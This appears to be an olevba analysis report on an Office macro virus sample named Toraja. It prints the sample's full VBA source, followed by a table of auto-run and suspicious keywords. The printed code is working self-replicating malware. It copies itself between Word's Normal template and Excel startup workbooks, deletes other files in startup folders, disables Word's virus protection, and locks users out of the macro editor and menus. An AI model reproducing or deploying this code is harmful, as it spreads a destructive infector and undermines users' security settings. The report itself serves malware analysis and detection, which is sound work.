olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toraja17.bas 
in file: Virus.MSOffice.Toraja-ad9e38821f710f7e9e206e00910bd0adb9ffd846 - OLE stream: '_VBA_PROJECT_CUR/VBA/Toraja17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Created       : Toraja High Land 1998 by Marsel - Lina
'Modified      : July 1999
'--------------------------------------------------------------
Option Explicit
Option Compare Text
Dim Komp As Variant, ctl As Variant
Public Const regApp As String = "Application": Public Const regSecSet As String = "Settings"
Public Const TempVer As String = "Tana": Public Const MacName As String = "Toraja"
Public Const fStartUp As String = "AutoRecover": Public Const Ver As String = "17"
Dim CusProp, blnMod As Boolean, actWindow
Global Active, Temp, tempPath, blnFound As Boolean, blnXls As Boolean
Sub Register()
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
Function Serang() As Boolean
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If getDate <= Date Then MsgBox "This command not available now.", vbCritical, "ToKing ..."
End Function
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = 0
RemStartUp Application.StartupPath & Application.PathSeparator
If MacroContainer <> fStartUp & Ver & ".dot" Then
    Application.DisplayRecentFiles = False
    MenuWord
    Register
Else
    Application.Documents.Open Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat"
    WordBasic.DisableAutoMacros 1
    AddIns.Unload False
    WordBasic.DisableAutoMacros 0
    Documents(fStartUp & Ver & ".dat").Close False
    Application.StatusBar = ""
End If
End Sub
Sub AutoNew()
On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Function RemStartUp(fPath) As Boolean
On Error GoTo salah
blnXls = False: blnFound = False: blnMod = False
If Dir(fPath, 16) <> "" Then
  Komp = Dir(fPath, 0 Or 1 Or 2)
  Do While Komp <> ""
    If Komp = fStartUp & Ver & ".dot" Then blnMod = True: SetAttr fPath & Komp, 1
    If Komp = fStartUp & Ver & ".dat" Then blnFound = True: SetAttr fPath & Komp, 1 + 2
    If Komp = fStartUp & Ver & ".XLS" Then blnXls = True
    If Komp <> "." And Komp <> ".." And Komp <> fStartUp & Ver & ".dot" And Komp <> fStartUp & Ver & ".dat" And _
       Komp <> "MSCREATE.DIR" And Left(Komp, 2) <> "~$" And Komp <> fStartUp & Ver & ".XLS" Then _
       SetAttr fPath & Komp, vbNormal: Kill fPath & Komp
      Komp = Dir
  Loop
  If blnMod = True And blnFound = True Then RemStartUp = True
End If
Exit Function
salah:
Resume Next
End Function
Sub AutoOpen()
On Error Resume Next
Dim strRun As String
ActiveTemp
RemoveAll
MenuWord
Register
If blnFound = True Then
   strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
   Application.OnTime Now + TimeValue("00:01:00"), strRun
End If
End Sub
Sub AutoExit()
Application.Visible = False
Application.DisplayAlerts = 0
ExportXls
If RemStartUp(Application.StartupPath & Application.PathSeparator) = False Then
   Documents.Add
   ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", 0
   ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dot", 1
End If
End Sub
Function KeyWord() As Boolean
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros 1
Dialogs(80).Show
TempActive
WordBasic.DisableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan) As Boolean
On Error GoTo salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
   If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And _
      (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
        If Komp.Name = MacName & Ver Then
              If Tujuan.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines > 0 Then blnMod = True Else _
                  Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
        Else
            Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
        End If
      KompProject = True
   End If
Next Komp
If blnMod = False Then
   If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
End If
salah:
End Function
Sub RemoveAll()
On Error Resume Next
Set ctl = Documents
For Each ctl In Documents
    If ctl <> ActiveDocument Then
        KompProject ActiveDocument, ctl
        If Len(ctl.Path) <> 0 Then ctl.Save
    End If
Next ctl
End Sub
Function PrintOke() As Boolean
Const CP = "cPrt"
On Error GoTo salah
If KeyWord = True Or GetCreator = True Then
    PrintOke = True
Else
    If CusProp.Item(CP).Value < 2 Then
        CusProp.Item(CP).Value = CusProp.Item(CP).Value + 1
        If Val(GetSetting(regApp, regSecSet, CP)) <= 50 Then
            SaveSetting regApp, regSecSet, CP, Val(GetSetting(regApp, regSecSet, CP)) + 1
            PrintOke = True
        End If
    End If
End If
salah:
End Function
Sub FilePrint()
On Error Resume Next
If PrintOke = True Then Dialogs(88).Show Else If Dialogs(88).Display = -1 Then Serang
End Sub
Sub FilePrintDefault()
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Serang
End Sub
Sub ViewCode()
Serang
End Sub
Sub ViewVbCode()
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then Application.ShowVisualBasicEditor = True Else Serang
End Sub
Sub ToolsCustomize()
Serang
End Sub
Sub FormatStyle()
If KeyWord = True Then Dialogs(180).Show Else Serang
End Sub
Sub ToolsRecordMacroToggle()
Serang
End Sub
Sub ToolsMacro()
Serang
End Sub
Sub FileTemplates()
Serang
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
On Error Resume Next
Set xlsApp = GetObject(, "Excel.Application")
If xlsApp Is Nothing Then
    Set xlsApp = CreateObject("Excel.Application")
    If Not xlsApp Is Nothing Then GoSub CheckXls:   xlsApp.Application.Quit
Else
    GoSub CheckXls
End If
Exit Sub
CheckXls:
     RemStartUp xlsApp.StartupPath & xlsApp.PathSeparator
    If blnXls = False Then
        xlsApp.Workbooks.Add
        strFile = xlsApp.StartupPath & xlsApp.PathSeparator & fStartUp & Ver & ".XLS"
        xlsApp.ActiveWorkbook.SaveAs strFile
        tempPath = Application.NormalTemplate.Path & Application.PathSeparator
        EIKModul NormalTemplate, xlsApp.Workbooks(fStartUp & Ver & ".XLS"), MacName & Ver
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").VBProject.Name = TempVer & Ver
        xlsApp.ActiveWindow.Visible = False
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").Save
    End If
Return
End Sub
Sub ExportDok()
Dim dokApp
On Error Resume Next
Set dokApp = GetObject(, "Word.Application")
If dokApp Is Nothing Then
    Set dokApp = CreateObject("Word.Application")
    If Not dokApp Is Nothing Then GoSub CheckDoc: dokApp.Application.Quit True
Else
    GoSub CheckDoc
End If
Exit Sub
CheckDoc:
tempPath = Application.TemplatesPath
KompProject Workbooks(fStartUp & Ver & ".XLS"), dokApp.NormalTemplate
RemStartUp dokApp.StartupPath & dokApp.PathSeparator
Return
End Sub
Sub Auto_Open()
On Error Resume Next
Application.EnableCancelKey = 0
XlsActive
ExportDok
Application.DisplayRecentFiles = False
End Sub
Private Sub AllWorkBook()
blnMod = False
For Each Komp In Workbooks
      actWindow = Komp.Name
      If actWindow = fStartUp & Ver & ".XLS" Then blnMod = True
      If Komp.Path = Application.StartupPath And actWindow <> fStartUp & Ver & ".XLS" Then
               Komp.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next Komp
If blnMod = False Then BuatXlsActive
End Sub
Sub XlsActive()
On Error Resume Next
Application.DisplayAlerts = False
CreateEvents
TempActive
AllWorkBook
Application.OnSheetActivate = "": Application.OnSheetDeactivate = "": Application.OnWindow = ""
MenuExcel
Application.OnWindow = fStartUp & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
End Sub
Sub TempActive()
On Error Resume Next
Aplikasi
If KompProject(Temp, Active) = True Then
   SetCusProp
   Active.VBProject.Name = MacName
   If Len(Active.Path) <> 0 Then Active.Save
End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
On Error GoTo salah
    Asal.VBProject.VBComponents(Komp).Export tempPath & Komp
    Tujuan.VBProject.VBComponents.Import tempPath & Komp
    EIKModul = True
    Kill tempPath & Komp
salah:
End Function
Sub OpenFile()
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim vbComp
On Error GoTo salah
Lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> fStartUp & Ver & ".XLS" Then
On Error GoTo FatalError
    Set vbComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With vbComp
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            .InsertLines 2, "On Error Resume Next"
            .InsertLines 3, "If PrintOke = False Then"
            .InsertLines 4, "    Serang"
            .InsertLines 5, "    Cancel = True"
            .InsertLines 6, "End if"
            .InsertLines 7, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume Lanjut
End Sub
Sub BuatXlsActive()
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
On Error Resume Next
Aplikasi
If KompProject(Active, Temp) = True Then
   Temp.VBProject.Name = TempVer & Ver
   Temp.Save
   blnFound = True
End If
End Sub
Sub MenuExcel()
On Error Resume Next
For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
    ctl.OnAction = "Serang"
Next ctl
WordExcel
CommandBars("Ply").Controls("View Code").Delete
With Application
    .OnKey "%{F11}", "Serang": .OnKey "%{F8}", "Serang": .OnKey "%{F2}", "Serang"
    .OnKey "%{F4}", "Serang": .OnKey "{F12}", "Serang": .OnKey "^{o}", "OpenFile"
End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("Window").Controls("Unhide...").Enabled = False
End Sub
Sub WordExcel()
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars.ActiveMenuBar, False
cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
With cmd
If blnVis = True Then
    .Enabled = False: .Visible = False: .Protection = 8
End If
    .Protection = 1
End With
End Sub
Sub MenuWord()
On Error Resume Next
CustomizationContext = NormalTemplate
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .SaveInterval = 0
End With
FindKey(BuildKeyCode(1024, 119)).Disable
FindKey(BuildKeyCode(1024, 112)).Disable
WordExcel
End Sub
Sub SetCusProp()
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, "": CusProp.Add "cPrt", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
On Error GoTo salah
Aplikasi
Set CusProp = Active.CustomDocumentProperties
If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
salah:
End Function
Function PWords() As Boolean
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then PWords = True
End Function
Sub FoundIt()
TempActive: blnFound = False
End Sub
Function Tator() As Boolean
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function
Sub Aplikasi()
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
tempPath = Application.NormalTemplate.Path & Application.PathSeparator: Set Active = ActiveDocument: Set Temp = NormalTemplate
End Sub
Sub Xls()
Set Active = ActiveWorkbook: Set Temp = Workbooks(fStartUp & Ver & ".XLS"): tempPath = Application.TemplatesPath
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

